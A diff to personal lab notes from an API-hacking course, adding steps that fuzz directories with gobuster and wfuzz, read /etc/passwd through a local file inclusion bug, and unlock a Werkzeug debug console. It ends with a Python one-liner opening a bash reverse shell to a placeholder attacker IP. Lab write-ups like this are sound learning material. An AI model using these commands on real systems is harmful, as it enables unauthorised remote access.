@@ -67,6 +67,20 @@
         robots.txt doesn't want bots scanning api
         ![tcm_api_fuzz_2](tcm_api_fuzz_2.png)
 
+        Fuzzing
+
+        ```bash
+        gobuster dir -u http://10.10.139.243:5000/ -w /usr/share/wordlists/dirb/big.txt -t 60
+        ```
+
+        ![alt text](image.png)
+
+        Now if I visit http://10.10.139.243:5000/console I see the below
+        
+        ![alt text](image-1.png)
+
+
+
         we visit that api path and we get this
         so now we know how to use the api
         ![tcm_api_fuzz_3](tcm_api_fuzz_3.png)
@@ -90,8 +104,28 @@
         wfuzz -c -z file,/usr/share/wordlists/dirb/common.txt --sc 200 'http://10.10.121.118:5000/api/v1/resources/books?FUZZ=%27'
         ```
 
-        show
+        I am having an issue with the lab, i rebooted the target machine but none of the scans are showing me the show result, anyways, I snatched teh shot from somewhere online.
+        ![alt text](image-7.png)
 
+        ![alt text](image-2.png)
+
+        Seems like we have LFI, checking ```/etc/passwd```
+
+        ![alt text](image-8.png)
+
+        Checking users list and locating target user
+        ![alt text](image-9.png)
+
+        ![alt text](image-5.png)
+
+        Now we can try out that pin from above in the interactive console, yup it worked!
+        ![alt text](image-6.png)
+
+        https://exploit-notes.hdks.org/exploit/web/framework/python/werkzeug-pentesting/
+        
+        ```python
+        __import__('os').popen('bash -c "bash -i >& /dev/tcp/<attacker_IP>/4444 0>&1"').read()
+        ```
 
 
 
@@ -104,7 +138,7 @@
 
 
 
-!!! info "Attacking Authorization" 
+!!! info "" 
 
     ### Attacking Authorization
 
@@ -163,4 +197,10 @@
 !!! info "" 
 
     ### Final Capstone
+
+!!! info ""
+
+    ### Resources
+
+    [exploit-notes.hdks](https://exploit-notes.hdks.org/exploit/web/api/)
 
